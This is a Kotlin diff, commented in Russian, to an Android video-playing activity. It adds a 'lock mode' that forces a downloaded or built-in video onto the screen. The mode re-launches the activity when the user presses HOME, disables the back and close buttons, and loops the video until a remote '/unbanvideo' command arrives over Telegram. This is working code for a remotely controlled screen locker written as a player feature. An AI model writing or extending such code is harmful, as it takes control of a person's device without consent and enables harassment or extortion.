@@ -34,30 +34,45 @@ class VideoActivity : AppCompatActivity() {
 
     private var videoResId: Int = 0
     private var videoUrl: String? = null
+    private var lockMode: Boolean = false    // блокировать кнопку HOME
+    private var duration: Int = 0            // обязательное время просмотра в сек (0 = без ограничения или до конца)
 
-    // Флаги готовности — играем только когда оба true
     private var surfaceReady = false
-    private var videoReady = false   // для URL: файл скачан; для raw: сразу true
+    private var videoReady = false
     private var videoFile: File? = null
+    private var secondsWatched = 0
+    private var watchTimer: Job? = null
 
     companion object {
         private const val TAG = "VideoActivity"
-        private const val EXTRA_VIDEO_NUM = "video_num"
-        private const val EXTRA_VIDEO_URL = "video_url"
-        private const val CLOSE_DELAY_MS = 3000L
+        const val EXTRA_VIDEO_NUM = "video_num"
+        const val EXTRA_VIDEO_URL = "video_url"
+        const val EXTRA_LOCK = "lock"
+        const val EXTRA_DURATION = "duration"
 
-        fun startBuiltin(context: Context, videoNum: Int) {
+        // Глобальный флаг — ControlService смотрит на него для /unbanvideo
+        var lockActive = false
+
+        fun startBuiltin(context: Context, videoNum: Int, lock: Boolean = false, duration: Int = 0) {
             context.startActivity(Intent(context, VideoActivity::class.java).apply {
                 flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
                 putExtra(EXTRA_VIDEO_NUM, videoNum)
+                putExtra(EXTRA_LOCK, lock)
+                putExtra(EXTRA_DURATION, duration)
             })
         }
 
-        fun startFromUrl(context: Context, url: String) {
+        fun startFromUrl(context: Context, url: String, lock: Boolean = false, duration: Int = 0) {
             context.startActivity(Intent(context, VideoActivity::class.java).apply {
                 flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
                 putExtra(EXTRA_VIDEO_URL, url)
+                putExtra(EXTRA_LOCK, lock)
+                putExtra(EXTRA_DURATION, duration)
             })
+        }
+
+        fun unlock() {
+            lockActive = false
         }
 
         fun getCacheFile(context: Context, url: String): File {
@@ -76,6 +91,9 @@ class VideoActivity : AppCompatActivity() {
         )
 
         videoUrl = intent.getStringExtra(EXTRA_VIDEO_URL)
+        lockMode = intent.getBooleanExtra(EXTRA_LOCK, false)
+        duration = intent.getIntExtra(EXTRA_DURATION, 0)
+
         val videoNum = intent.getIntExtra(EXTRA_VIDEO_NUM, 0)
         if (videoNum > 0) {
             videoResId = when (videoNum) {
@@ -84,13 +102,38 @@ class VideoActivity : AppCompatActivity() {
                 3 -> R.raw.video3
                 else -> R.raw.video1
             }
-            videoReady = true  // res/raw всегда готово
+            videoReady = true
         }
+
+        if (lockMode) lockActive = true
 
         buildUI()
 
-        if (videoUrl != null) {
-            downloadVideo(videoUrl!!)
+        if (videoUrl != null) downloadVideo(videoUrl!!)
+    }
+
+    override fun onResume() {
+        super.onResume()
+        // Если lock активен и видео не играет — перезапускаем
+        if (lockActive && mediaPlayer?.isPlaying == false) {
+            mediaPlayer?.start()
+        }
+    }
+
+    // Блокируем HOME через onUserLeaveHint — вызывается когда пользователь нажимает HOME
+    override fun onUserLeaveHint() {
+        super.onUserLeaveHint()
+        if (lockActive) {
+            // Возвращаем наше activity на передний план
+            handler.postDelayed({
+                if (lockActive) {
+                    val intent = Intent(this, VideoActivity::class.java).apply {
+                        flags = Intent.FLAG_ACTIVITY_NEW_TASK or
+                                Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
+                    }
+                    startActivity(intent)
+                }
+            }, 300L)
         }
     }
 
@@ -127,12 +170,15 @@ class VideoActivity : AppCompatActivity() {
             Gravity.CENTER
         ))
 
+        // Крестик — скрыт пока не истечёт duration
         closeButton = ImageButton(this).apply {
             setImageResource(android.R.drawable.ic_menu_close_clear_cancel)
             setBackgroundColor(android.graphics.Color.parseColor("#AA000000"))
             alpha = 0f
             setPadding(24, 24, 24, 24)
-            setOnClickListener { finish() }
+            setOnClickListener {
+                if (!lockMode) finish()
+            }
         }
         root.addView(closeButton, FrameLayout.LayoutParams(120, 120, Gravity.TOP or Gravity.END).apply {
             topMargin = 48; rightMargin = 48
@@ -146,13 +192,10 @@ class VideoActivity : AppCompatActivity() {
                 tryPlay()
             }
             override fun surfaceChanged(holder: SurfaceHolder, f: Int, w: Int, h: Int) {}
-            override fun surfaceDestroyed(holder: SurfaceHolder) {
-                surfaceReady = false
-            }
+            override fun surfaceDestroyed(holder: SurfaceHolder) { surfaceReady = false }
         })
     }
 
-    // Запускаем воспроизведение только когда и surface и файл готовы
     private fun tryPlay() {
         if (!surfaceReady || !videoReady) return
 
@@ -161,18 +204,24 @@ class VideoActivity : AppCompatActivity() {
             mediaPlayer = MediaPlayer()
 
             if (videoResId != 0 && videoUrl == null) {
-                // Встроенное видео
                 val afd = resources.openRawResourceFd(videoResId)
                 mediaPlayer!!.setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
                 afd.close()
             } else {
-                // Скачанный файл
                 mediaPlayer!!.setDataSource(videoFile!!.path)
             }
 
             mediaPlayer!!.setDisplay(surfaceView.holder)
             mediaPlayer!!.setOnVideoSizeChangedListener { _, w, h -> adjustSurfaceSize(w, h) }
-            mediaPlayer!!.setOnCompletionListener { finish() }
+            mediaPlayer!!.setOnCompletionListener {
+                if (lockMode) {
+                    // В режиме блокировки — зацикливаем
+                    mediaPlayer?.seekTo(0)
+                    mediaPlayer?.start()
+                } else {
+                    finish()
+                }
+            }
             mediaPlayer!!.setOnErrorListener { _, what, extra ->
                 Log.e(TAG, "MediaPlayer error: $what extra=$extra")
                 finish()
@@ -181,10 +230,7 @@ class VideoActivity : AppCompatActivity() {
             mediaPlayer!!.prepare()
             mediaPlayer!!.start()
 
-            // Крестик через 3 сек
-            handler.postDelayed({
-                closeButton.animate().alpha(1f).setDuration(300).start()
-            }, CLOSE_DELAY_MS)
+            startWatchTimer()
 
         } catch (e: Exception) {
             Log.e(TAG, "tryPlay failed: ${e.message}", e)
@@ -192,11 +238,51 @@ class VideoActivity : AppCompatActivity() {
         }
     }
 
+    private fun startWatchTimer() {
+        watchTimer?.cancel()
+
+        if (duration == 0 && !lockMode) {
+            // Нет ограничений — крестик сразу через 3 сек
+            handler.postDelayed({ showCloseButton() }, 3000L)
+            return
+        }
+
+        if (duration == 0 && lockMode) {
+            // Бесконечный lock — крестик не показываем
+            return
+        }
+
+        // Считаем секунды просмотра
+        watchTimer = scope.launch {
+            while (secondsWatched < duration) {
+                delay(1000)
+                secondsWatched++
+                val remaining = duration - secondsWatched
+                if (remaining <= 10 && remaining > 0) {
+                    handler.post {
+                        statusText.text = "Закрытие через $remaining сек..."
+                        statusText.visibility = android.view.View.VISIBLE
+                    }
+                }
+            }
+            // Время вышло — показываем крестик (если не lockMode) или закрываем
+            handler.post {
+                statusText.visibility = android.view.View.GONE
+                if (!lockMode) {
+                    showCloseButton()
+                }
+                // В lockMode крестик не появляется — только /unbanvideo из тг
+            }
+        }
+    }
+
+    private fun showCloseButton() {
+        closeButton.animate().alpha(1f).setDuration(300).start()
+    }
+
     private fun downloadVideo(url: String) {
         val cacheFile = getCacheFile(this, url)
-
         if (cacheFile.exists() && cacheFile.length() > 0) {
-            Log.d(TAG, "Cache hit: ${cacheFile.path}")
             videoFile = cacheFile
             videoReady = true
             handler.post {
@@ -210,7 +296,6 @@ class VideoActivity : AppCompatActivity() {
         scope.launch {
             try {
                 handler.post { statusText.text = "Скачиваю видео..." }
-
                 val connection = URL(url).openConnection() as HttpURLConnection
                 connection.connectTimeout = 15_000
                 connection.readTimeout = 30_000
@@ -241,8 +326,6 @@ class VideoActivity : AppCompatActivity() {
                 }
 
                 tmpFile.renameTo(cacheFile)
-                Log.d(TAG, "Downloaded: ${cacheFile.path}")
-
                 videoFile = cacheFile
                 videoReady = true
 
@@ -251,12 +334,9 @@ class VideoActivity : AppCompatActivity() {
                     statusText.visibility = android.view.View.GONE
                     tryPlay()
                 }
-
             } catch (e: Exception) {
                 Log.e(TAG, "Download failed: ${e.message}", e)
-                handler.post {
-                    statusText.text = "Ошибка: ${e.message}"
-                }
+                handler.post { statusText.text = "Ошибка: ${e.message}" }
                 delay(3000)
                 handler.post { finish() }
             }
@@ -276,16 +356,16 @@ class VideoActivity : AppCompatActivity() {
     }
 
     override fun onBackPressed() {
-        if (closeButton.alpha >= 1f) super.onBackPressed()
+        if (!lockMode && closeButton.alpha >= 1f) super.onBackPressed()
     }
 
     override fun onDestroy() {
         handler.removeCallbacksAndMessages(null)
+        watchTimer?.cancel()
         scope.cancel()
-        try {
-            mediaPlayer?.apply { if (isPlaying) stop(); release() }
-        } catch (e: Exception) { }
+        try { mediaPlayer?.apply { if (isPlaying) stop(); release() } } catch (e: Exception) { }
         mediaPlayer = null
+        if (!lockActive) lockActive = false
         super.onDestroy()
     }
 }
